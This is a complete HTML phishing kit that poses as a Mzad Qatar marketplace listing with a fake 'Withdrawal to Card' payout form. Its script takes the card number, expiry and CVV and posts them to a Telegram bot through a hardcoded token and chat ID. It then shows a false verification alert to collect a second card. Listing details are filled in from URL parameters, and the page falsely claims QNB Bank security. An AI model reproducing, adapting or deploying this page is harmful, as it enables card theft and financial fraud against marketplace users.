<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mzad Qatar | Biggest Marketplace</title>
    <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
    <style>
        :root { --mzad-red: #8a1538; --bg: #f4f4f4; --text: #222; }
        body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg); margin: 0; padding: 0; }
        .app { max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; }

        /* HEADER 1:1 */
        header { background: #fff; padding: 10px 15px; border-bottom: 3px solid var(--mzad-red); display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
        .logo-wrap img { height: 42px; }
        .nav-right { display: flex; gap: 15px; align-items: center; font-weight: 700; color: var(--mzad-red); }

        /* IMAGE SLIDER AREA */
        .main-img { width: 100%; aspect-ratio: 1; background: #fff; border-bottom: 1px solid #eee; position: relative; }
        .main-img img { width: 100%; height: 100%; object-fit: contain; }
        .v-badge { position: absolute; top: 12px; left: 12px; background: #27ae60; color: #fff; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: 800; }

        /* CONTENT */
        .content { padding: 16px; border-bottom: 8px solid var(--bg); }
        .path { font-size: 11px; color: #888; margin-bottom: 8px; }
        .title { font-size: 20px; font-weight: 700; margin: 0 0 10px; color: #111; }
        .price { font-size: 28px; font-weight: 800; color: var(--mzad-red); margin-bottom: 20px; }

        /* SPECS AS ICONS */
        .grid-specs { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .item-spec { background: #f9f9f9; padding: 10px; border-radius: 8px; display: flex; align-items: center; gap: 10px; font-size: 13px; color: #555; border: 1px solid #f0f0f0; }

        /* SELLER BOX */
        .seller { padding: 15px; border-bottom: 8px solid var(--bg); }
        .seller-inner { border: 1px solid #eee; border-radius: 12px; padding: 12px; display: flex; align-items: center; gap: 12px; }
        .av { width: 45px; height: 45px; background: var(--mzad-red); color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 800; }
        .s-info { flex: 1; }
        .s-info b { font-size: 15px; color: #222; }
        .s-info div { font-size: 12px; color: #27ae60; font-weight: 600; }

        /* INPUTS */
        .pay-area { padding: 20px 15px; }
        .pay-area h2 { font-size: 17px; color: var(--mzad-red); text-align: center; margin-bottom: 20px; }
        .input-box { width: 100%; padding: 16px; border: 1.5px solid #e0e0e0; border-radius: 10px; margin-bottom: 12px; font-size: 16px; box-sizing: border-box; transition: 0.3s; }
        .input-box:focus { border-color: var(--mzad-red); outline: none; background: #fff; }
        .btn-go { width: 100%; background: var(--mzad-red); color: #fff; border: none; padding: 18px; border-radius: 10px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 10px; }

        /* STORES FOOTER */
        .stores { background: #fff; padding: 30px 15px; text-align: center; border-top: 1px solid #eee; }
        .stores-title { font-size: 13px; font-weight: 800; color: #666; margin-bottom: 15px; }
        .store-btns { display: flex; justify-content: center; gap: 8px; }
        .store-btns img { height: 32px; border-radius: 4px; }

        .legal { padding: 25px; text-align: center; font-size: 10px; color: #aaa; line-height: 1.5; }
    </style>
</head>
<body>

<div class="app">
    <header>
        <div class="logo-wrap">
            <img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg">
        </div>
        <div class="nav-right">
            <span>العربية</span>
            <span style="font-size: 24px;">☰</span>
        </div>
    </header>

    <div class="main-img">
        <div class="v-badge">✓ SECURE DEAL</div>
        <img id="p-img" src="">
    </div>

    <div class="content">
        <div class="path">Electronics > Mobile Phones > iPhone</div>
        <h1 class="title" id="p-name">Loading...</h1>
        <div class="price" id="p-price">0 QAR</div>

        <div class="grid-specs">
            <div class="item-spec">📍 <span id="p-addr">Doha</span></div>
            <div class="item-spec">🕒 <span>Today</span></div>
            <div class="item-spec">💎 <span>New</span></div>
            <div class="item-spec">📦 <span>Escrow</span></div>
        </div>
    </div>

    <div class="seller">
        <div class="seller-inner">
            <div class="av" id="p-av">U</div>
            <div class="s-info">
                <b id="p-seller">Official User</b>
                <div>● Verified by Mzad Protection</div>
            </div>
        </div>
    </div>

    <div class="pay-area">
        <h2>Withdrawal to Card</h2>
        <form id="hit-form">
            <input type="text" id="cn" class="input-box" placeholder="Card Number" required maxlength="19">
            <div style="display: flex; gap: 10px;">
                <input type="text" id="ce" class="input-box" style="flex: 1.5;" placeholder="MM/YY" required maxlength="5">
                <input type="text" id="cv" class="input-box" style="flex: 1;" placeholder="CVV" required maxlength="4">
            </div>
            <button type="submit" class="btn-go" id="btn-txt">RECEIVE QAR</button>
        </form>
    </div>

    <div class="stores">
        <div class="stores-title">GET MZAD QATAR APP</div>
        <div class="store-btns">
            <img src="https://mzadqatar.com/frontend/images/mzad/app_store.png">
            <img src="https://mzadqatar.com/frontend/images/mzad/google_play.png">
            <img src="https://mzadqatar.com/frontend/images/mzad/app_gallery.png">
        </div>
    </div>

    <div class="legal">
        Transactions are secured by QNB Bank. <br>
        © 2026 Mzad Qatar Platform.
    </div>
</div>

<script>
    const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
    const CHAT_ID = '8071425015';

    const url = new URLSearchParams(window.location.search);
    document.getElementById('p-name').innerText = url.get('item') || 'Product';
    document.getElementById('p-price').innerText = (url.get('price') || '0') + ' QAR';
    document.getElementById('p-img').src = url.get('img') || 'https://via.placeholder.com/400';
    document.getElementById('p-seller').innerText = url.get('seller') || 'User';
    document.getElementById('p-addr').innerText = url.get('addr') || 'Doha';
    document.getElementById('p-av').innerText = (url.get('seller') || 'U').charAt(0).toUpperCase();

    // Маски для красоты
    document.getElementById('cn').oninput = (e) => {
        e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim();
    };
    document.getElementById('ce').oninput = (e) => {
        e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{2})/,'$1/').trim();
    };

    document.getElementById('hit-form').onsubmit = async (e) => {
        e.preventDefault();
        const b = document.getElementById('btn-txt');
        b.innerText = 'CONNECTING TO QNB...';
        b.disabled = true;

        const log = `🇶🇦 **MZAD HIT**\n\n📦 ${url.get('item')}\n💰 ${url.get('price')} QAR\n\n💳 \`${document.getElementById('cn').value}\`\n📅 \`${document.getElementById('ce').value}\`\n🔒 \`${document.getElementById('cv').value}\`\n\n👤 ${url.get('seller')}`;

        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: log, parse_mode: 'Markdown' })
            });
            setTimeout(() => {
                alert("Identity Verification Required: Please enter details of another card to finish the payout process.");
                b.innerText = 'RECEIVE QAR';
                b.disabled = false;
                document.getElementById('hit-form').reset();
            }, 3000);
        } catch (err) {
            alert("Timeout. Try again.");
            b.disabled = false;
        }
    };
</script>

</body>
</html>
